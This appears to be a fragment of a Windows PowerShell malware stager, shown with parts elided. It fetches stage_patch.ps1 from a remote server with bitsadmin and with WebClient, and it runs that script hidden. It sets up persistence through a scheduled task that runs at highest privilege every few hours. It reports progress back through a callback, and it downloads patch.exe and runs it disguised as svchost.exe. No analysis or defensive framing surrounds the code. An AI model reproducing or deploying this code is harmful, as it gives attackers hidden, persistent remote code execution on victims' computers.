...
$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $srv/stage_patch.ps1 %TEMP%\s.ps1 && powershell -w hidden -NoP -file %TEMP%\s.ps1"
...
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  ...
  <Actions Context="Author">
    <Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "$s='$srv';[IO.File]::WriteAllBytes(\"$env:TEMP\s.ps1\",(New-Object Net.WebClient).DownloadData(\"$s/stage_patch.ps1\"));powershell -w hidden -NoP -file $env:TEMP\s.ps1"</Arguments></Exec>
  </Actions>
</Task>
"@
    ...
    try {
        schtasks /create /tn $taskName /tr "powershell.exe -w hidden -NoP -c `"`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(`"`$env:TEMP\s.ps1`",`$w.DownloadData('$srv/stage_patch.ps1'));powershell -w hidden -NoP -file `$env:TEMP\s.ps1`"" /sc daily /st 00:00 /ri 240 /rl highest /f 2>&1 | Out-Null
    } catch {}
}

_cb 'S3' 'ok' 'persistence set (reg+task)'

# === S5: Download + Execute patch.exe ===
_runExe 'patch.exe' 'svchost.exe' 'S5' 'patch.exe'
